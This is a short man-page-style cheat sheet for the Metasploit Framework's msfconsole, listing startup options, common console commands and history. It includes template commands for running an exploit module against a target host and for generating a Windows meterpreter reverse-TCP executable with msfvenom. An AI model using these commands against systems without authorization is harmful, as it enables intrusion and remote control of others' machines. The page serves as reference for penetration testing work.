# TAGLINE

penetration testing platform for developing, testing, and executing exploits

# TLDR

**Start Metasploit console**

```msfconsole```

**Start without banner**

```msfconsole -q```

**Execute resource script**

```msfconsole -r [script.rc]```

**Database initialization**

```msfdb init```

**Run specific module**

```msfconsole -x "use [exploit/module]; set RHOSTS [target]; run"```

**Generate payload**

```msfvenom -p [windows/meterpreter/reverse_tcp] LHOST=[ip] LPORT=[port] -f [exe] > [payload.exe]```

# SYNOPSIS

**msfconsole** [_options_]

# PARAMETERS

**-q**, **--quiet**
> Don't print banner.

**-r** _file_
> Resource script file.

**-x** _cmd_
> Execute command.

**-o** _file_
> Output file.

**-e** _encoder_
> Encoder to use.

# DESCRIPTION

**Metasploit Framework** is a penetration testing platform for developing, testing, and executing exploits. It includes a large database of public exploits and payloads for security testing.

The framework includes msfconsole (interactive shell), msfvenom (payload generator), and auxiliary tools.

# COMMON COMMANDS

```
search <term>     - Search modules
use <module>      - Select module
info              - Module details
set <opt> <val>   - Set option
run               - Execute
```

# CAVEATS

Requires authorization for use. Database setup recommended. Regular updates needed. Antivirus may flag payloads.

# HISTORY

Metasploit was created by **H.D. Moore** in **2003** as a portable network tool. It was acquired by **Rapid7** in **2009** and remains the most popular penetration testing framework.

# SEE ALSO

[nmap](/man/nmap)(1), [burpsuite](/man/burpsuite)(1), [sqlmap](/man/sqlmap)(1), [hydra](/man/hydra)(1)
